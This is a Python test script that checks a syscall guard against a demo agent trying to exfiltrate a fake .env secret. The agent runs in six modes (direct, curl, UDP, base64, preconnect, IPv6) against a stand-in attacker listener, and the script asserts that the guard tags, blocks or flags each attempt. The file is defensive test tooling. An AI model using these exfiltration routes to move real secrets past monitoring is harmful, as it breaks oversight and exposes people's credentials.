#!/usr/bin/env python3
"""attack_matrix.py — automated end-to-end verdict matrix (ROOT).

For each policy mode (audit, enforce) x each agent exfil mode
(direct, curl, udp, b64, preconnect, ipv6), it starts the real guard on a
temp policy, runs agent.py as a FRESH subprocess, and asserts on the
guard's OWN JSON events:

    enforce: TAG + BLOCK (+ ALLOW for the legitimate API call)
    audit:   TAG + WOULD_BLOCK (+ ALLOW)
    curl:    TAG_INHERIT for the curl child (fork inheritance proof)

The exfil target is a dummy TCP listener on this box's LAN IP
(non-loopback, so never allowlisted): preconnect NEEDS a connect() that
succeeds while untagged, which a blackhole address can't provide, and a
real listener keeps audit-mode TCP cells fast (no SYN timeouts).

The matrix parent NEVER reads the secret itself, so it never gets tagged;
every agent run is a fresh, cleanly-tagged process — no manual fresh
terminals needed.

Usage:
    sudo python3 tests/attack_matrix.py            # full 12-cell matrix
    sudo python3 tests/attack_matrix.py --quick    # enforce only (6 cells)
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
API_PORT = 18081
ATTACKER_PORT = 9999
READY_TIMEOUT = 90        # first bcc compile can be slow
DRAIN_AFTER_AGENT = 4

AGENT_MODES = ("direct", "curl", "udp", "b64", "preconnect", "ipv6")
# modes whose verdict must arrive via the sendmsg hook (their raison d'etre)
SENDMSG_MODES = ("udp", "preconnect")


class Guard:
    """A running guard.py subprocess with its JSON events collected."""

    def __init__(self, policy_path, log_path):
        self.events = []
        self._ready = threading.Event()
        self.proc = subprocess.Popen(
            [sys.executable, os.path.join(REPO, "guard", "guard.py"),
             "-p", policy_path],
            stdout=subprocess.PIPE, stderr=open(log_path, "w"),
            text=True, bufsize=1)
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()

    def _reader(self):
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
            except json.JSONDecodeError:
                continue
            self.events.append(msg)
            if msg.get("type") == "READY":
                self._ready.set()

    def wait_ready(self):
        return self._ready.wait(READY_TIMEOUT)

    def stop(self):
        self.proc.terminate()
        try:
            self.proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self.proc.kill()

    def for_tgid(self, tgid):
        """Events about tgid or its children."""
        return [e for e in self.events
                if e.get("tgid") == tgid or e.get("parent_tgid") == tgid]


def lan_ip():
    """Primary non-loopback IPv4, via a UDP route lookup (sends nothing)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()
    return None if ip.startswith("127.") else ip


class Attacker:
    """Dummy exfil receiver on the LAN IP. Accepts and drains TCP; the
    point is to be REACHABLE (preconnect's first connect must succeed
    while the agent is still untagged). Untagged itself, so silent."""

    def __init__(self, ip, port=ATTACKER_PORT):
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((ip, port))
        self._srv.listen(16)
        self._srv.settimeout(0.5)
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        while not self._stop.is_set():
            try:
                c, _ = self._srv.accept()
            except (socket.timeout, OSError):
                continue
            try:
                c.settimeout(2)
                while c.recv(65536):
                    pass
            except OSError:
                pass
            finally:
                c.close()

    def close(self):
        self._stop.set()
        self._thread.join(timeout=5)
        self._srv.close()


def write_secret(tmp):
    """Create the fake secret ONCE, before any guard is running.

    The matrix parent must never open the protected file while a guard
    is alive (hook A tags on *any* open, including write). Creating it
    once up front makes that structural instead of relying on ordering.
    """
    secret = os.path.join(tmp, ".env")
    with open(secret, "w") as f:
        f.write("FAKE-SECRET-FOR-MATRIX\n")
    return secret


def write_policy(tmp, mode, secret):
    pol = os.path.join(tmp, "policy.toml")
    with open(pol, "w") as f:
        f.write(f'mode = "{mode}"\n'
                f'protect = ["{secret}"]\n'
                f'allow = ["127.0.0.0/8", "::1/128"]\n')
    return pol


def main(argv=None):
    ap = argparse.ArgumentParser(description="SyscallGuard attack matrix")
    ap.add_argument("--quick", action="store_true",
                    help="enforce mode only (6 cells)")
    args = ap.parse_args(argv)

    if os.geteuid() != 0:
        print("FAIL: must run as root: sudo python3 tests/attack_matrix.py",
              file=sys.stderr)
        return 1

    modes = ["enforce"] if args.quick else ["audit", "enforce"]
    results = []  # (policy_mode, agent_mode, ok|None, notes)

    attacker_ip = lan_ip()
    attacker = None
    if attacker_ip:
        print(f"attacker target: {attacker_ip}:{ATTACKER_PORT} (test listener)")
        attacker = Attacker(attacker_ip)
    else:
        print("WARN: no non-loopback IP found; preconnect cells will be skipped")
        attacker_ip = "192.0.2.1"  # TEST-NET-1 fallback for the other modes

    tmp = tempfile.mkdtemp(prefix="sg_matrix_")
    secret = write_secret(tmp)  # before any guard exists; never touched again
    api = subprocess.Popen(
        [sys.executable, os.path.join(REPO, "demo", "internal_api.py"),
         "--host", "127.0.0.1", "--port", str(API_PORT)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    try:
        for pmode in modes:
            pol = write_policy(tmp, pmode, secret)
            guard = Guard(pol, os.path.join(tmp, f"guard-{pmode}.log"))
            if not guard.wait_ready():
                print(f"FAIL: guard did not become READY in {pmode} mode")
                guard.stop()
                return 1
            print(f"== policy mode: {pmode} ==")

            for amode in AGENT_MODES:
                if amode == "preconnect" and attacker is None:
                    print("  [SKIP] preconnect  (needs a reachable attacker)")
                    results.append((pmode, amode, None, ["skipped"]))
                    continue
                guard.events.clear()
                agent = subprocess.Popen(
                    [sys.executable, os.path.join(REPO, "demo", "agent.py"),
                     "--mode", amode, "--env", secret,
                     "--attacker", attacker_ip, "--port", str(ATTACKER_PORT),
                     "--api", f"http://127.0.0.1:{API_PORT}"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True)
                agent_pid = agent.pid
                try:
                    stdout, _ = agent.communicate(timeout=90)
                except subprocess.TimeoutExpired:
                    agent.kill()
                    stdout, _ = agent.communicate()
                time.sleep(DRAIN_AFTER_AGENT)
                evs = guard.for_tgid(agent_pid)
                by_type = {}
                for e in evs:
                    by_type.setdefault(e.get("type"), []).append(e)

                notes, ok = [], True

                def need(name, cond, hint=""):
                    nonlocal ok
                    if not cond:
                        ok = False
                        notes.append(f"missing {name} {hint}".strip())

                need("TAG", len(by_type.get("TAG", [])) > 0)
                verdict = "BLOCK" if pmode == "enforce" else "WOULD_BLOCK"
                # Match the exfil verdict by DESTINATION across the whole
                # cell's event window (guard.events was cleared at cell
                # start). Tgid linkage alone isn't enough: curl re-tags
                # itself via hook A when it opens the .env for
                # --data-binary, so its BLOCK/WOULD_BLOCK carries
                # parent_tgid=None and never lands in the tgid-filtered
                # `evs` list.
                cell_hits = [e for e in guard.events
                             if e.get("type") == verdict
                             and e.get("daddr") == attacker_ip]
                need(verdict, len(cell_hits) > 0)
                if amode in SENDMSG_MODES:
                    need(f"{verdict} via sendmsg",
                         any(e.get("hook") == "sendmsg" for e in cell_hits))
                need("ALLOW for internal API",
                     any(e.get("daddr") == "127.0.0.1"
                         for e in by_type.get("ALLOW", [])))
                if amode == "curl":
                    need("TAG_INHERIT for curl child",
                         any(e.get("parent_tgid") == agent_pid
                             for e in by_type.get("TAG_INHERIT", [])))
                # The EPERM lands in the curl *child*, which the agent
                # can't see — the guard's BLOCK event is the proof there.
                if pmode == "enforce" and amode != "curl":
                    need("agent reported BLOCKED",
                         "BLOCKED by the guard" in stdout)
                status = "PASS" if ok else "FAIL"
                print(f"  [{status}] {amode:10s} "
                      f"{' '.join(sorted(by_type))}"
                      + ("" if ok else f"  <-- {'; '.join(notes)}"))
                if not ok:
                    for line in stdout.strip().split("\n")[-5:]:
                        print(f"      | {line}")
                    # diagnostic: dump every event seen this cell, plus any
                    # BLOCK/WOULD_BLOCK in the whole run that didn't match
                    print(f"      # matched events: {len(evs)}, "
                          f"total this guard run: {len(guard.events)}")
                    for e in guard.events:
                        if e.get("type") in ("BLOCK", "WOULD_BLOCK"):
                            m = "MATCHED" if e in evs else "stray"
                            print(f"      # {m} {e.get('type')} hook={e.get('hook')} "
                                  f"tgid={e.get('tgid')} parent={e.get('parent_tgid')} "
                                  f"daddr={e.get('daddr')}:{e.get('dport')}")
                results.append((pmode, amode, ok, notes))

            guard.stop()
    finally:
        api.terminate()
        if attacker:
            attacker.close()

    ran = [r for r in results if r[2] is not None]
    passed = sum(1 for _, _, ok, _ in ran if ok)
    print(f"== {passed}/{len(ran)} cells passed ==")
    for pmode, amode, ok, notes in results:
        if ok is False:
            print(f"  FAIL {pmode}/{amode}: {'; '.join(notes)}")
    return 0 if passed == len(ran) else 1


if __name__ == "__main__":
    raise SystemExit(main())
